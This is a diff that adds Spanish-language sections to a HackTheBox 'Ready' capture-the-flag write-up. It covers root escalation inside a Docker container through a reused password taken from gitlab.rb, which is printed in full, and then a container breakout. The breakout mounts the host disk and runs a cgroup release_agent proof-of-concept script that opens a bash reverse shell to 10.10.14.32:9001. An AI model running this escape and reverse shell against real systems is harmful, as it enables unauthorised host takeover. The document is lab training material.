@@ -61,4 +61,63 @@ Lo ejecuto y obtengo el acceso inicial.
 
 ![](/assets/images/Ready-Hackthebox/foothold.png)
 
+## Escalada a root dentro del contenedor docker
+---
 
+Veo que hay un usuario llamado dude en el directorio home y directamente ya puedo leer el user.txt porque los permisos del fichero están configurados para que los usuarios que pertenezcan al grupo git lo puedan leer.
+
+Sigo eumerando el sistema hasta que encuentro en /opt/backup el fichero gitlab.rb donde veo la siguiente contraseña:
+
+gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
+
+Pensando en la reutilización de contraseñas pruebo la contraseña con la cuenta de root y accedo como root pero eso si, del contenedor. Estamos en un contenedor docker.
+
+![](/assets/images/Ready-Hackthebox/docker.png)
+
+## Escalada a root
+---
+
+Siendo root dentro del contenedor busco información sobre como escapar del contenedor docker y encuentro esta página:
+
+[https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout)
+
+Con fdisk -l veo que a partición del sistema host es /dev/sda2
+
+Creo un directorio en /mnt y monto la partición allí. Ya puedo leer el root.txt
+
+```bash
+mkdir -p /mnt/root
+mount /dev/sda2 /mnt/root
+```
+
+Ya tengo el root.txt pero además quiero obtener una shell de root en la máquina.
+
+Veo que hay una poc (prueba de concepto) en la misma página así que la pruebo.
+
+![](/assets/images/Ready-Hackthebox/poc.png)
+
+Me creo un fichero llamado poc.sh en el directorio /tmp con el contenido de la poc
+
+```bash
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+
+#For a normal PoC =================
+echo '#!/bin/sh' > /cmd
+echo "ps aux > $host_path/output" >> /cmd
+chmod a+x /cmd
+#===================================
+#Reverse shell
+echo '#!/bin/bash' > /cmd
+echo "bash -i >& /dev/tcp/10.10.14.32/9001 0>&1" >> /cmd
+chmod a+x /cmd
+#===================================
+
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+head /output
+```
+
+Me pongo a la escucha en el puerto 9001 y ejecuto ./poc.sh y me devuelve la shell de root :)
